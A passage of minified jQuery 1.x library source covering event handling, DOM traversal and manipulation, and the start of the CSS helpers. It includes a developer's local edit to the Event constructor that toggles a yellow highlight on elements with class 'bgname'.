                        p = x.event.special[d] || {}, d = (r ? p.delegateType : p.bindType) || d, f = c[d] || [], s = s[2] && RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), l = o = f.length;
                        while (o--) a = f[o], !i && g !== a.origType || n && n.guid !== a.guid || s && !s.test(a.namespace) || r && r !== a.selector && ("**" !== r || !a.selector) || (f.splice(o, 1), a.selector && f.delegateCount--, p.remove && p.remove.call(e, a));
                        l && !f.length && (p.teardown && p.teardown.call(e, h, m.handle) !== !1 || x.removeEvent(e, d, m.handle), delete c[d])
                    } else
                        for (d in c) x.event.remove(e, d + t[u], n, r, !0);
                x.isEmptyObject(c) && (delete m.handle, x._removeData(e, "events"))
            }
        },
        trigger: function(n, r, i, o) {
            var s, l, u, c, p, f, d, h = [i || a],
                g = v.call(n, "type") ? n.type : n,
                m = v.call(n, "namespace") ? n.namespace.split(".") : [];
            if (u = f = i = i || a, 3 !== i.nodeType && 8 !== i.nodeType && !nt.test(g + x.event.triggered) && (g.indexOf(".") >= 0 && (m = g.split("."), g = m.shift(), m.sort()), l = 0 > g.indexOf(":") && "on" + g, n = n[x.expando] ? n : new x.Event(g, "object" == typeof n && n), n.isTrigger = o ? 2 : 3, n.namespace = m.join("."), n.namespace_re = n.namespace ? RegExp("(^|\\.)" + m.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, n.result = t, n.target || (n.target = i), r = null == r ? [n] : x.makeArray(r, [n]), p = x.event.special[g] || {}, o || !p.trigger || p.trigger.apply(i, r) !== !1)) {
                if (!o && !p.noBubble && !x.isWindow(i)) {
                    for (c = p.delegateType || g, nt.test(c + g) || (u = u.parentNode); u; u = u.parentNode) h.push(u), f = u;
                    f === (i.ownerDocument || a) && h.push(f.defaultView || f.parentWindow || e)
                }
                d = 0;
                while ((u = h[d++]) && !n.isPropagationStopped()) n.type = d > 1 ? c : p.bindType || g, s = (x._data(u, "events") || {})[n.type] && x._data(u, "handle"), s && s.apply(u, r), s = l && u[l], s && x.acceptData(u) && s.apply && s.apply(u, r) === !1 && n.preventDefault();
                if (n.type = g, !o && !n.isDefaultPrevented() && (!p._default || p._default.apply(h.pop(), r) === !1) && x.acceptData(i) && l && i[g] && !x.isWindow(i)) {
                    f = i[l], f && (i[l] = null), x.event.triggered = g;
                    try {
                        i[g]()
                    } catch (y) {}
                    x.event.triggered = t, f && (i[l] = f)
                }
                return n.result
            }
        },
        dispatch: function(e) {
            e = x.event.fix(e);
            var n, r, i, o, a, s = [],
                l = g.call(arguments),
                u = (x._data(this, "events") || {})[e.type] || [],
                c = x.event.special[e.type] || {};
            if (l[0] = e, e.delegateTarget = this, !c.preDispatch || c.preDispatch.call(this, e) !== !1) {
                s = x.event.handlers.call(this, e, u), n = 0;
                while ((o = s[n++]) && !e.isPropagationStopped()) {
                    e.currentTarget = o.elem, a = 0;
                    while ((i = o.handlers[a++]) && !e.isImmediatePropagationStopped())(!e.namespace_re || e.namespace_re.test(i.namespace)) && (e.handleObj = i, e.data = i.data, r = ((x.event.special[i.origType] || {}).handle || i.handler).apply(o.elem, l), r !== t && (e.result = r) === !1 && (e.preventDefault(), e.stopPropagation()))
                }
                return c.postDispatch && c.postDispatch.call(this, e), e.result
            }
        },
        handlers: function(e, n) {
            var r, i, o, a, s = [],
                l = n.delegateCount,
                u = e.target;
            if (l && u.nodeType && (!e.button || "click" !== e.type))
                for (; u != this; u = u.parentNode || this)
                    if (1 === u.nodeType && (u.disabled !== !0 || "click" !== e.type)) {
                        for (o = [], a = 0; l > a; a++) i = n[a], r = i.selector + " ", o[r] === t && (o[r] = i.needsContext ? x(r, this).index(u) >= 0 : x.find(r, this, null, [u]).length), o[r] && o.push(i);
                        o.length && s.push({
                            elem: u,
                            handlers: o
                        })
                    }
            return n.length > l && s.push({
                elem: this,
                handlers: n.slice(l)
            }), s
        },
        fix: function(e) {
            if (e[x.expando]) return e;
            var t, n, r, i = e.type,
                o = e,
                s = this.fixHooks[i];
            s || (this.fixHooks[i] = s = tt.test(i) ? this.mouseHooks : et.test(i) ? this.keyHooks : {}), r = s.props ? this.props.concat(s.props) : this.props, e = new x.Event(o), t = r.length;
            while (t--) n = r[t], e[n] = o[n];
            return e.target || (e.target = o.srcElement || a), 3 === e.target.nodeType && (e.target = e.target.parentNode), e.metaKey = !!e.metaKey, s.filter ? s.filter(e, o) : e
        },
        props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
        fixHooks: {},
        keyHooks: {
            props: "char charCode key keyCode".split(" "),
            filter: function(e, t) {
                return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode), e
            }
        },
        mouseHooks: {
            props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
            filter: function(e, n) {
                var r, i, o, s = n.button,
                    l = n.fromElement;
                return null == e.pageX && null != n.clientX && (i = e.target.ownerDocument || a, o = i.documentElement, r = i.body, e.pageX = n.clientX + (o && o.scrollLeft || r && r.scrollLeft || 0) - (o && o.clientLeft || r && r.clientLeft || 0), e.pageY = n.clientY + (o && o.scrollTop || r && r.scrollTop || 0) - (o && o.clientTop || r && r.clientTop || 0)), !e.relatedTarget && l && (e.relatedTarget = l === e.target ? n.toElement : l), e.which || s === t || (e.which = 1 & s ? 1 : 2 & s ? 3 : 4 & s ? 2 : 0), e
            }
        },
        special: {
            load: {
                noBubble: !0
            },
            focus: {
                trigger: function() {
                    if (this !== at() && this.focus) try {
                        return this.focus(), !1
                    } catch (e) {}
                },
                delegateType: "focusin"
            },
            blur: {
                trigger: function() {
                    return this === at() && this.blur ? (this.blur(), !1) : t
                },
                delegateType: "focusout"
            },
            click: {
                trigger: function() {
                    return x.nodeName(this, "input") && "checkbox" === this.type && this.click ? (this.click(), !1) : t
                },
                _default: function(e) {
                    return x.nodeName(e.target, "a")
                }
            },
            beforeunload: {
                postDispatch: function(e) {
                    e.result !== t && (e.originalEvent.returnValue = e.result)
                }
            }
        },
        simulate: function(e, t, n, r) {
            var i = x.extend(new x.Event, n, {
                type: e,
                isSimulated: !0,
                originalEvent: {}
            });
            r ? x.event.trigger(i, null, t) : x.event.dispatch.call(t, i), i.isDefaultPrevented() && n.preventDefault()
        }
    }, x.removeEvent = a.removeEventListener ? function(e, t, n) {
        e.removeEventListener && e.removeEventListener(t, n, !1)
    } : function(e, t, n) {
        var r = "on" + t;
        e.detachEvent && (typeof e[r] === i && (e[r] = null), e.detachEvent(r, n))
    }, x.Event = function(e, n) {
                if(e.toElement && e.toElement.className == "bgname"){
                        //console.log(e.toElement.className);
                        //e.toElement.css("backgroundColor", "yellow");

                        if(e.toElement.style.backgroundColor == "yellow")
                        {
                            e.toElement.style.backgroundColor = "white"

                        }
                        else{
                            //console.log($(".bgname"));
                            var z = document.getElementsByClassName("bgname");
                            //console.log(z);

                            for(ss in z){

                                //console.log(z[ss]);
                                try{
                                    z[ss].style.backgroundColor = "white";
                                }
                                catch(ex){


                                }

                            }

                            e.toElement.style.backgroundColor = "yellow"

                        }
        }
        return this instanceof x.Event ? (e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || e.returnValue === !1 || e.getPreventDefault && e.getPreventDefault() ? it : ot) : this.type = e, n && x.extend(this, n), this.timeStamp = e && e.timeStamp || x.now(), this[x.expando] = !0, t) : new x.Event(e, n)
    }, x.Event.prototype = {
        isDefaultPrevented: ot,
        isPropagationStopped: ot,
        isImmediatePropagationStopped: ot,
        preventDefault: function() {
            var e = this.originalEvent;
            this.isDefaultPrevented = it, e && (e.preventDefault ? e.preventDefault() : e.returnValue = !1)
        },
        stopPropagation: function() {
            var e = this.originalEvent;
            this.isPropagationStopped = it, e && (e.stopPropagation && e.stopPropagation(), e.cancelBubble = !0)
        },
        stopImmediatePropagation: function() {
            this.isImmediatePropagationStopped = it, this.stopPropagation()
        }
    }, x.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout"
    }, function(e, t) {
        x.event.special[e] = {
            delegateType: t,
            bindType: t,
            handle: function(e) {
                var n, r = this,
                    i = e.relatedTarget,
                    o = e.handleObj;
                return (!i || i !== r && !x.contains(r, i)) && (e.type = o.origType, n = o.handler.apply(this, arguments), e.type = t), n
            }
        }
    }), x.support.submitBubbles || (x.event.special.submit = {
        setup: function() {
            return x.nodeName(this, "form") ? !1 : (x.event.add(this, "click._submit keypress._submit", function(e) {
                var n = e.target,
                    r = x.nodeName(n, "input") || x.nodeName(n, "button") ? n.form : t;
                r && !x._data(r, "submitBubbles") && (x.event.add(r, "submit._submit", function(e) {
                    e._submit_bubble = !0
                }), x._data(r, "submitBubbles", !0))
            }), t)
        },
        postDispatch: function(e) {
            e._submit_bubble && (delete e._submit_bubble, this.parentNode && !e.isTrigger && x.event.simulate("submit", this.parentNode, e, !0))
        },
        teardown: function() {
            return x.nodeName(this, "form") ? !1 : (x.event.remove(this, "._submit"), t)
        }
    }), x.support.changeBubbles || (x.event.special.change = {
        setup: function() {
            return Z.test(this.nodeName) ? (("checkbox" === this.type || "radio" === this.type) && (x.event.add(this, "propertychange._change", function(e) {
                "checked" === e.originalEvent.propertyName && (this._just_changed = !0)
            }), x.event.add(this, "click._change", function(e) {
                this._just_changed && !e.isTrigger && (this._just_changed = !1), x.event.simulate("change", this, e, !0)
            })), !1) : (x.event.add(this, "beforeactivate._change", function(e) {
                var t = e.target;
                Z.test(t.nodeName) && !x._data(t, "changeBubbles") && (x.event.add(t, "change._change", function(e) {
                    !this.parentNode || e.isSimulated || e.isTrigger || x.event.simulate("change", this.parentNode, e, !0)
                }), x._data(t, "changeBubbles", !0))
            }), t)
        },
        handle: function(e) {
            var n = e.target;
            return this !== n || e.isSimulated || e.isTrigger || "radio" !== n.type && "checkbox" !== n.type ? e.handleObj.handler.apply(this, arguments) : t
        },
        teardown: function() {
            return x.event.remove(this, "._change"), !Z.test(this.nodeName)
        }
    }), x.support.focusinBubbles || x.each({
        focus: "focusin",
        blur: "focusout"
    }, function(e, t) {
        var n = 0,
            r = function(e) {
                x.event.simulate(t, e.target, x.event.fix(e), !0)
            };
        x.event.special[t] = {
            setup: function() {
                0 === n++ && a.addEventListener(e, r, !0)
            },
            teardown: function() {
                0 === --n && a.removeEventListener(e, r, !0)
            }
        }
    }), x.fn.extend({
        on: function(e, n, r, i, o) {
            var a, s;
            if ("object" == typeof e) {
                "string" != typeof n && (r = r || n, n = t);
                for (a in e) this.on(a, n, r, e[a], o);
                return this
            }
            if (null == r && null == i ? (i = n, r = n = t) : null == i && ("string" == typeof n ? (i = r, r = t) : (i = r, r = n, n = t)), i === !1) i = ot;
            else if (!i) return this;
            return 1 === o && (s = i, i = function(e) {
                return x().off(e), s.apply(this, arguments)
            }, i.guid = s.guid || (s.guid = x.guid++)), this.each(function() {
                x.event.add(this, e, i, r, n)
            })
        },
        one: function(e, t, n, r) {
            return this.on(e, t, n, r, 1)
        },
        off: function(e, n, r) {
            var i, o;
            if (e && e.preventDefault && e.handleObj) return i = e.handleObj, x(e.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this;
            if ("object" == typeof e) {
                for (o in e) this.off(o, n, e[o]);
                return this
            }
            return (n === !1 || "function" == typeof n) && (r = n, n = t), r === !1 && (r = ot), this.each(function() {
                x.event.remove(this, e, r, n)
            })
        },
        trigger: function(e, t) {
            return this.each(function() {
                x.event.trigger(e, t, this)
            })
        },
        triggerHandler: function(e, n) {
            var r = this[0];
            return r ? x.event.trigger(e, n, r, !0) : t
        }
    });
    var st = /^.[^:#\[\.,]*$/,
        lt = /^(?:parents|prev(?:Until|All))/,
        ut = x.expr.match.needsContext,
        ct = {
            children: !0,
            contents: !0,
            next: !0,
            prev: !0
        };
    x.fn.extend({
        find: function(e) {
            var t, n = [],
                r = this,
                i = r.length;
            if ("string" != typeof e) return this.pushStack(x(e).filter(function() {
                for (t = 0; i > t; t++)
                    if (x.contains(r[t], this)) return !0
            }));
            for (t = 0; i > t; t++) x.find(e, r[t], n);
            return n = this.pushStack(i > 1 ? x.unique(n) : n), n.selector = this.selector ? this.selector + " " + e : e, n
        },
        has: function(e) {
            var t, n = x(e, this),
                r = n.length;
            return this.filter(function() {
                for (t = 0; r > t; t++)
                    if (x.contains(this, n[t])) return !0
            })
        },
        not: function(e) {
            return this.pushStack(ft(this, e || [], !0))
        },
        filter: function(e) {
            return this.pushStack(ft(this, e || [], !1))
        },
        is: function(e) {
            return !!ft(this, "string" == typeof e && ut.test(e) ? x(e) : e || [], !1).length
        },
        closest: function(e, t) {
            var n, r = 0,
                i = this.length,
                o = [],
                a = ut.test(e) || "string" != typeof e ? x(e, t || this.context) : 0;
            for (; i > r; r++)
                for (n = this[r]; n && n !== t; n = n.parentNode)
                    if (11 > n.nodeType && (a ? a.index(n) > -1 : 1 === n.nodeType && x.find.matchesSelector(n, e))) {
                        n = o.push(n);
                        break
                    }
            return this.pushStack(o.length > 1 ? x.unique(o) : o)
        },
        index: function(e) {
            return e ? "string" == typeof e ? x.inArray(this[0], x(e)) : x.inArray(e.jquery ? e[0] : e, this) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(e, t) {
            var n = "string" == typeof e ? x(e, t) : x.makeArray(e && e.nodeType ? [e] : e),
                r = x.merge(this.get(), n);
            return this.pushStack(x.unique(r))
        },
        addBack: function(e) {
            return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
        }
    });

    function pt(e, t) {
        do e = e[t]; while (e && 1 !== e.nodeType);
        return e
    }
    x.each({
        parent: function(e) {
            var t = e.parentNode;
            return t && 11 !== t.nodeType ? t : null
        },
        parents: function(e) {
            return x.dir(e, "parentNode")
        },
        parentsUntil: function(e, t, n) {
            return x.dir(e, "parentNode", n)
        },
        next: function(e) {
            return pt(e, "nextSibling")
        },
        prev: function(e) {
            return pt(e, "previousSibling")
        },
        nextAll: function(e) {
            return x.dir(e, "nextSibling")
        },
        prevAll: function(e) {
            return x.dir(e, "previousSibling")
        },
        nextUntil: function(e, t, n) {
            return x.dir(e, "nextSibling", n)
        },
        prevUntil: function(e, t, n) {
            return x.dir(e, "previousSibling", n)
        },
        siblings: function(e) {
            return x.sibling((e.parentNode || {}).firstChild, e)
        },
        children: function(e) {
            return x.sibling(e.firstChild)
        },
        contents: function(e) {
            return x.nodeName(e, "iframe") ? e.contentDocument || e.contentWindow.document : x.merge([], e.childNodes)
        }
    }, function(e, t) {
        x.fn[e] = function(n, r) {
            var i = x.map(this, t, n);
            return "Until" !== e.slice(-5) && (r = n), r && "string" == typeof r && (i = x.filter(r, i)), this.length > 1 && (ct[e] || (i = x.unique(i)), lt.test(e) && (i = i.reverse())), this.pushStack(i)
        }
    }), x.extend({
        filter: function(e, t, n) {
            var r = t[0];
            return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === r.nodeType ? x.find.matchesSelector(r, e) ? [r] : [] : x.find.matches(e, x.grep(t, function(e) {
                return 1 === e.nodeType
            }))
        },
        dir: function(e, n, r) {
            var i = [],
                o = e[n];
            while (o && 9 !== o.nodeType && (r === t || 1 !== o.nodeType || !x(o).is(r))) 1 === o.nodeType && i.push(o), o = o[n];
            return i
        },
        sibling: function(e, t) {
            var n = [];
            for (; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
            return n
        }
    });

    function ft(e, t, n) {
        if (x.isFunction(t)) return x.grep(e, function(e, r) {
            return !!t.call(e, r, e) !== n
        });
        if (t.nodeType) return x.grep(e, function(e) {
            return e === t !== n
        });
        if ("string" == typeof t) {
            if (st.test(t)) return x.filter(t, e, n);
            t = x.filter(t, e)
        }
        return x.grep(e, function(e) {
            return x.inArray(e, t) >= 0 !== n
        })
    }

    function dt(e) {
        var t = ht.split("|"),
            n = e.createDocumentFragment();
        if (n.createElement)
            while (t.length) n.createElement(t.pop());
        return n
    }
    var ht = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",
        gt = / jQuery\d+="(?:null|\d+)"/g,
        mt = RegExp("<(?:" + ht + ")[\\s/>]", "i"),
        yt = /^\s+/,
        vt = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
        bt = /<([\w:]+)/,
        xt = /<tbody/i,
        wt = /<|&#?\w+;/,
        Tt = /<(?:script|style|link)/i,
        Ct = /^(?:checkbox|radio)$/i,
        Nt = /checked\s*(?:[^=]|=\s*.checked.)/i,
        kt = /^$|\/(?:java|ecma)script/i,
        Et = /^true\/(.*)/,
        St = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
        At = {
            option: [1, "<select multiple='multiple'>", "</select>"],
            legend: [1, "<fieldset>", "</fieldset>"],
            area: [1, "<map>", "</map>"],
            param: [1, "<object>", "</object>"],
            thead: [1, "<table>", "</table>"],
            tr: [2, "<table><tbody>", "</tbody></table>"],
            col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
            td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
            _default: x.support.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
        },
        jt = dt(a),
        Dt = jt.appendChild(a.createElement("div"));
    At.optgroup = At.option, At.tbody = At.tfoot = At.colgroup = At.caption = At.thead, At.th = At.td, x.fn.extend({
        text: function(e) {
            return x.access(this, function(e) {
                return e === t ? x.text(this) : this.empty().append((this[0] && this[0].ownerDocument || a).createTextNode(e))
            }, null, e, arguments.length)
        },
        append: function() {
            return this.domManip(arguments, function(e) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var t = Lt(this, e);
                    //console.log(">>>>>");
                    //console.log(e);
                    t.appendChild(e)
                }
            })
        },
        prepend: function() {
            return this.domManip(arguments, function(e) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var t = Lt(this, e);
                    t.insertBefore(e, t.firstChild)
                }
            })
        },
        before: function() {
            return this.domManip(arguments, function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this)
            })
        },
        after: function() {
            return this.domManip(arguments, function(e) {
                this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
            })
        },
        remove: function(e, t) {
            var n, r = e ? x.filter(e, this) : this,
                i = 0;
            for (; null != (n = r[i]); i++) t || 1 !== n.nodeType || x.cleanData(Ft(n)), n.parentNode && (t && x.contains(n.ownerDocument, n) && _t(Ft(n, "script")), n.parentNode.removeChild(n));
            return this
        },
        empty: function() {
            var e, t = 0;
            for (; null != (e = this[t]); t++) {
                1 === e.nodeType && x.cleanData(Ft(e, !1));
                while (e.firstChild) e.removeChild(e.firstChild);
                e.options && x.nodeName(e, "select") && (e.options.length = 0)
            }
            return this
        },
        clone: function(e, t) {
            return e = null == e ? !1 : e, t = null == t ? e : t, this.map(function() {
                return x.clone(this, e, t)
            })
        },
        html: function(e) {
            return x.access(this, function(e) {
                var n = this[0] || {},
                    r = 0,
                    i = this.length;
                if (e === t) return 1 === n.nodeType ? n.innerHTML.replace(gt, "") : t;
                if (!("string" != typeof e || Tt.test(e) || !x.support.htmlSerialize && mt.test(e) || !x.support.leadingWhitespace && yt.test(e) || At[(bt.exec(e) || ["", ""])[1].toLowerCase()])) {
                    e = e.replace(vt, "<$1></$2>");
                    try {
                        for (; i > r; r++) n = this[r] || {}, 1 === n.nodeType && (x.cleanData(Ft(n, !1)), n.innerHTML = e);
                        n = 0
                    } catch (o) {}
                }
                n && this.empty().append(e)
            }, null, e, arguments.length)
        },
        replaceWith: function() {
            var e = x.map(this, function(e) {
                    return [e.nextSibling, e.parentNode]
                }),
                t = 0;
            return this.domManip(arguments, function(n) {
                var r = e[t++],
                    i = e[t++];
                i && (r && r.parentNode !== i && (r = this.nextSibling), x(this).remove(), i.insertBefore(n, r))
            }, !0), t ? this : this.remove()
        },
        detach: function(e) {
            return this.remove(e, !0)
        },
        domManip: function(e, t, n) {
            e = d.apply([], e);
            var r, i, o, a, s, l, u = 0,
                c = this.length,
                p = this,
                f = c - 1,
                h = e[0],
                g = x.isFunction(h);
            if (g || !(1 >= c || "string" != typeof h || x.support.checkClone) && Nt.test(h)) return this.each(function(r) {
                var i = p.eq(r);
                g && (e[0] = h.call(this, r, i.html())), i.domManip(e, t, n)
            });
            if (c && (l = x.buildFragment(e, this[0].ownerDocument, !1, !n && this), r = l.firstChild, 1 === l.childNodes.length && (l = r), r)) {
                for (a = x.map(Ft(l, "script"), Ht), o = a.length; c > u; u++) i = l, u !== f && (i = x.clone(i, !0, !0), o && x.merge(a, Ft(i, "script"))), t.call(this[u], i, u);
                if (o)
                    for (s = a[a.length - 1].ownerDocument, x.map(a, qt), u = 0; o > u; u++) i = a[u], kt.test(i.type || "") && !x._data(i, "globalEval") && x.contains(s, i) && (i.src ? x._evalUrl(i.src) : x.globalEval((i.text || i.textContent || i.innerHTML || "").replace(St, "")));
                l = r = null
            }
            return this
        }
    });

    function Lt(e, t) {
        return x.nodeName(e, "table") && x.nodeName(1 === t.nodeType ? t : t.firstChild, "tr") ? e.getElementsByTagName("tbody")[0] || e.appendChild(e.ownerDocument.createElement("tbody")) : e
    }

    function Ht(e) {
        return e.type = (null !== x.find.attr(e, "type")) + "/" + e.type, e
    }

    function qt(e) {
        var t = Et.exec(e.type);
        return t ? e.type = t[1] : e.removeAttribute("type"), e
    }

    function _t(e, t) {
        var n, r = 0;
        for (; null != (n = e[r]); r++) x._data(n, "globalEval", !t || x._data(t[r], "globalEval"))
    }

    function Mt(e, t) {
        if (1 === t.nodeType && x.hasData(e)) {
            var n, r, i, o = x._data(e),
                a = x._data(t, o),
                s = o.events;
            if (s) {
                delete a.handle, a.events = {};
                for (n in s)
                    for (r = 0, i = s[n].length; i > r; r++) x.event.add(t, n, s[n][r])
            }
            a.data && (a.data = x.extend({}, a.data))
        }
    }

    function Ot(e, t) {
        var n, r, i;
        if (1 === t.nodeType) {
            if (n = t.nodeName.toLowerCase(), !x.support.noCloneEvent && t[x.expando]) {
                i = x._data(t);
                for (r in i.events) x.removeEvent(t, r, i.handle);
                t.removeAttribute(x.expando)
            }
            "script" === n && t.text !== e.text ? (Ht(t).text = e.text, qt(t)) : "object" === n ? (t.parentNode && (t.outerHTML = e.outerHTML), x.support.html5Clone && e.innerHTML && !x.trim(t.innerHTML) && (t.innerHTML = e.innerHTML)) : "input" === n && Ct.test(e.type) ? (t.defaultChecked = t.checked = e.checked, t.value !== e.value && (t.value = e.value)) : "option" === n ? t.defaultSelected = t.selected = e.defaultSelected : ("input" === n || "textarea" === n) && (t.defaultValue = e.defaultValue)
        }
    }
    x.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, function(e, t) {
        x.fn[e] = function(e) {
            var n, r = 0,
                i = [],
                o = x(e),
                a = o.length - 1;
            for (; a >= r; r++) n = r === a ? this : this.clone(!0), x(o[r])[t](n), h.apply(i, n.get());
            return this.pushStack(i)
        }
    });

    function Ft(e, n) {
        var r, o, a = 0,
            s = typeof e.getElementsByTagName !== i ? e.getElementsByTagName(n || "*") : typeof e.querySelectorAll !== i ? e.querySelectorAll(n || "*") : t;
        if (!s)
            for (s = [], r = e.childNodes || e; null != (o = r[a]); a++) !n || x.nodeName(o, n) ? s.push(o) : x.merge(s, Ft(o, n));
        return n === t || n && x.nodeName(e, n) ? x.merge([e], s) : s
    }

    function Bt(e) {
        Ct.test(e.type) && (e.defaultChecked = e.checked)
    }
    x.extend({
        clone: function(e, t, n) {
            var r, i, o, a, s, l = x.contains(e.ownerDocument, e);
            if (x.support.html5Clone || x.isXMLDoc(e) || !mt.test("<" + e.nodeName + ">") ? o = e.cloneNode(!0) : (Dt.innerHTML = e.outerHTML, Dt.removeChild(o = Dt.firstChild)), !(x.support.noCloneEvent && x.support.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || x.isXMLDoc(e)))
                for (r = Ft(o), s = Ft(e), a = 0; null != (i = s[a]); ++a) r[a] && Ot(i, r[a]);
            if (t)
                if (n)
                    for (s = s || Ft(e), r = r || Ft(o), a = 0; null != (i = s[a]); a++) Mt(i, r[a]);
                else Mt(e, o);
            return r = Ft(o, "script"), r.length > 0 && _t(r, !l && Ft(e, "script")), r = s = i = null, o
        },
        buildFragment: function(e, t, n, r) {
            var i, o, a, s, l, u, c, p = e.length,
                f = dt(t),
                d = [],
                h = 0;
            for (; p > h; h++)
                if (o = e[h], o || 0 === o)
                    if ("object" === x.type(o)) x.merge(d, o.nodeType ? [o] : o);
                    else if (wt.test(o)) {
                s = s || f.appendChild(t.createElement("div")), l = (bt.exec(o) || ["", ""])[1].toLowerCase(), c = At[l] || At._default, s.innerHTML = c[1] + o.replace(vt, "<$1></$2>") + c[2], i = c[0];
                while (i--) s = s.lastChild;
                if (!x.support.leadingWhitespace && yt.test(o) && d.push(t.createTextNode(yt.exec(o)[0])), !x.support.tbody) {
                    o = "table" !== l || xt.test(o) ? "<table>" !== c[1] || xt.test(o) ? 0 : s : s.firstChild, i = o && o.childNodes.length;
                    while (i--) x.nodeName(u = o.childNodes[i], "tbody") && !u.childNodes.length && o.removeChild(u)
                }
                x.merge(d, s.childNodes), s.textContent = "";
                while (s.firstChild) s.removeChild(s.firstChild);
                s = f.lastChild
            } else d.push(t.createTextNode(o));
            s && f.removeChild(s), x.support.appendChecked || x.grep(Ft(d, "input"), Bt), h = 0;
            while (o = d[h++])
                if ((!r || -1 === x.inArray(o, r)) && (a = x.contains(o.ownerDocument, o), s = Ft(f.appendChild(o), "script"), a && _t(s), n)) {
                    i = 0;
                    while (o = s[i++]) kt.test(o.type || "") && n.push(o)
                }
            return s = null, f
        },
        cleanData: function(e, t) {
            var n, r, o, a, s = 0,
                l = x.expando,
                u = x.cache,
                c = x.support.deleteExpando,
                f = x.event.special;
            for (; null != (n = e[s]); s++)
                if ((t || x.acceptData(n)) && (o = n[l], a = o && u[o])) {
                    if (a.events)
                        for (r in a.events) f[r] ? x.event.remove(n, r) : x.removeEvent(n, r, a.handle);
                    u[o] && (delete u[o], c ? delete n[l] : typeof n.removeAttribute !== i ? n.removeAttribute(l) : n[l] = null, p.push(o))
                }
        },
        _evalUrl: function(e) {
            return x.ajax({
                url: e,
                type: "GET",
                dataType: "script",
                async: !1,
                global: !1,
                "throws": !0
            })
        }
    }), x.fn.extend({
        wrapAll: function(e) {
            if (x.isFunction(e)) return this.each(function(t) {
                x(this).wrapAll(e.call(this, t))
            });
            if (this[0]) {
                var t = x(e, this[0].ownerDocument).eq(0).clone(!0);
                this[0].parentNode && t.insertBefore(this[0]), t.map(function() {
                    var e = this;
                    while (e.firstChild && 1 === e.firstChild.nodeType) e = e.firstChild;
                    return e
                }).append(this)
            }
            return this
        },
        wrapInner: function(e) {
            return x.isFunction(e) ? this.each(function(t) {
                x(this).wrapInner(e.call(this, t))
            }) : this.each(function() {
                var t = x(this),
                    n = t.contents();
                n.length ? n.wrapAll(e) : t.append(e)
            })
        },
        wrap: function(e) {
            var t = x.isFunction(e);
            return this.each(function(n) {
                x(this).wrapAll(t ? e.call(this, n) : e)
            })
        },
        unwrap: function() {
            return this.parent().each(function() {
                x.nodeName(this, "body") || x(this).replaceWith(this.childNodes)
            }).end()
        }
    });
    var Pt, Rt, Wt, $t = /alpha\([^)]*\)/i,
        It = /opacity\s*=\s*([^)]*)/,
        zt = /^(top|right|bottom|left)$/,
        Xt = /^(none|table(?!-c[ea]).+)/,
        Ut = /^margin/,
        Vt = RegExp("^(" + w + ")(.*)$", "i"),
        Yt = RegExp("^(" + w + ")(?!px)[a-z%]+$", "i"),
        Jt = RegExp("^([+-])=(" + w + ")", "i"),
        Gt = {
            BODY: "block"
        },
        Qt = {
            position: "absolute",
            visibility: "hidden",
            display: "block"
        },
        Kt = {
            letterSpacing: 0,
            fontWeight: 400
        },
        Zt = ["Top", "Right", "Bottom", "Left"],
        en = ["Webkit", "O", "Moz", "ms"];

    function tn(e, t) {
        if (t in e) return t;
        var n = t.charAt(0).toUpperCase() + t.slice(1),
            r = t,
            i = en.length;
        while (i--)
            if (t = en[i] + n, t in e) return t;
        return r
    }

    function nn(e, t) {
        return e = t || e, "none" === x.css(e, "display") || !x.contains(e.ownerDocument, e)
    }

    function rn(e, t) {
        var n, r, i, o = [],
            a = 0,
            s = e.length;
        for (; s > a; a++) r = e[a], r.style && (o[a] = x._data(r, "olddisplay"), n = r.style.display, t ? (o[a] || "none" !== n || (r.style.display = ""), "" === r.style.display && nn(r) && (o[a] = x._data(r, "olddisplay", ln(r.nodeName)))) : o[a] || (i = nn(r), (n && "none" !== n || !i) && x._data(r, "olddisplay", i ? n : x.css(r, "display"))));
        for (a = 0; s > a; a++) r = e[a], r.style && (t && "none" !== r.style.display && "" !== r.style.display || (r.style.display = t ? o[a] || "" : "none"));
        return e
    }
    x.fn.extend({
        css: function(e, n) {
            return x.access(this, function(e, n, r) {
                var i, o, a = {},
                    s = 0;
                if (x.isArray(n)) {
                    for (o = Rt(e), i = n.length; i > s; s++) a[n[s]] = x.css(e, n[s], !1, o);
                    return a
                }
                return r !== t ? x.style(e, n, r) : x.css(e, n)
            }, e, n, arguments.length > 1)
        },
        show: function() {
            return rn(this, !0)
        },
        hide: function() {
            return rn(this)
        },
        toggle: function(e) {
            return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function() {
                nn(this) ? x(this).show() : x(this).hide()
            })
        }
    }), x.extend({
        cssHooks: {
            opacity: {
                get: function(e, t) {
                    if (t) {
                        var n = Wt(e, "opacity");
                        return "" === n ? "1" : n
                    }
                }
            }
        },
        cssNumber: {
            columnCount: !0,
            fillOpacity: !0,
            fontWeight: !0,
